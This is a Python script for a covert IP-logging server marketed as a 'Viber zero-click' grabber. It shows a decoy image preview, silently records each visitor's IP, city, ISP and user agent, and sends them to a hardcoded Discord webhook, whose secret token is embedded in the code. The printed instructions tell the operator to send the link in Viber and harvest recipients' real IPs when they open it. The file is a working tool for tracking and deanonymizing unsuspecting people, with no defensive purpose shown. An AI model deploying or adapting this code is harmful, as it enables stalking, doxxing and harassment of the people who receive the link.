from http.server import HTTPServer, BaseHTTPRequestHandler
import requests, json, time

WEBHOOK_URL = "https://discord.com/api/webhooks/1437431909297950831/hOR6sC5C0jZqrc19t0udy6CD02ujqAOVlyNAg07omPr8m9jTDKg_OHmPkxsIDU1XI-bS"

# Viber user agent patterns
VIBER_AGENTS = [
    'Viber',
    'ViberBot', 
    'viber',
    'VIBER'
]

class ViberZeroClickLogger(BaseHTTPRequestHandler):
    
    def do_GET(self):
        try:
            # Get client IP from all possible sources
            client_ip = (self.headers.get('X-Forwarded-For', '').split(',')[0] or 
                        self.headers.get('X-Real-IP') or 
                        self.headers.get('CF-Connecting-IP') or
                        self.headers.get('True-Client-IP') or
                        self.client_address[0])
            
            user_agent = self.headers.get('User-Agent', '')
            referer = self.headers.get('Referer', '')
            
            # Check if this is Viber preview bot
            is_viber = any(agent in user_agent for agent in VIBER_AGENTS)
            is_preview = 'preview' in user_agent.lower() or 'bot' in user_agent.lower()
            
            # Get detailed IP information
            ip_info = {}
            try:
                ip_info = requests.get(f'http://ip-api.com/json/{client_ip}?fields=country,countryCode,region,regionName,city,isp,org,as,query,proxy,hosting,mobile').json()
            except:
                ip_info = {'country': 'Unknown', 'isp': 'Unknown', 'city': 'Unknown'}
            
            # Only log if it's Viber's preview system or a new IP
            if is_viber or is_preview or client_ip not in self.server.seen_ips:
                self.server.seen_ips.add(client_ip)
                
                embed = {
                    "username": "Viber Zero-Click Logger",
                    "embeds": [{
                        "title": "🚨 VIBER ZERO-CLICK TRIGGERED",
                        "color": 0x9146FF,  # Viber purple
                        "description": f"**Platform:** Viber\n**Type:** {'Preview Bot' if is_viber else 'User Click'}\n**Auto-captured:** {'YES' if is_viber else 'User Clicked'}",
                        "fields": [
                            {"name": "🌐 IP Address", "value": f"```{client_ip}```", "inline": True},
                            {"name": "📍 Country", "value": ip_info.get('country', 'Unknown'), "inline": True},
                            {"name": "🏙️ City", "value": ip_info.get('city', 'Unknown'), "inline": True},
                            {"name": "📡 ISP", "value": ip_info.get('isp', 'Unknown'), "inline": True},
                            {"name": "🤖 User Agent", "value": f"```{user_agent[:300] if user_agent else 'Unknown'}```", "inline": False},
                            {"name": "🔗 Referer", "value": f"```{referer[:100] if referer else 'Direct'}```", "inline": False}
                        ],
                        "footer": {"text": f"Viber Zero-Click • {time.strftime('%Y-%m-%d %H:%M:%S')}"}
                    }]
                }
                
                requests.post(WEBHOOK_URL, json=embed)
            
            # Serve OG tags for Viber preview
            if is_viber or is_preview:
                # Viber is requesting preview - serve OG meta tags
                preview_html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta property="og:title" content="Interesting Image">
    <meta property="og:description" content="Check this out!">
    <meta property="og:image" content="https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg">
    <meta property="og:url" content="https://your-server.com/image.jpg">
    <meta name="twitter:card" content="summary_large_image">
</head>
<body>
    <img src="https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg" style="width:100%;height:auto;">
</body>
</html>
'''
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(preview_html.encode())
            else:
                # Regular user - redirect to actual image
                self.send_response(302)
                self.send_header('Location', 'https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg')
                self.end_headers()
                
        except Exception as e:
            # Fallback redirect
            self.send_response(302)
            self.send_header('Location', 'https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg')
            self.end_headers()

    def log_message(self, format, *args):
        pass

def run_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), ViberZeroClickLogger)
    server.seen_ips = set()  # Track seen IPs to avoid duplicates
    print("🔥 VIBER ZERO-CLICK LOGGER ACTIVATED")
    print("="*50)
    print("YOUR VIBER ZERO-CLICK LINK:")
    print(f"http://your-server.com:{port}/image.jpg")
    print("\n" + "="*50)
    print("VIBER SPECIFIC INSTRUCTIONS:")
    print("1. Send the link in Viber - wait 10-30 seconds")
    print("2. Viber servers will crawl it for preview generation")
    print("3. You'll get Viber's server IP automatically")
    print("4. When user opens, you get their real IP")
    print("="*50)
    server.serve_forever()

if __name__ == "__main__":
    run_server()
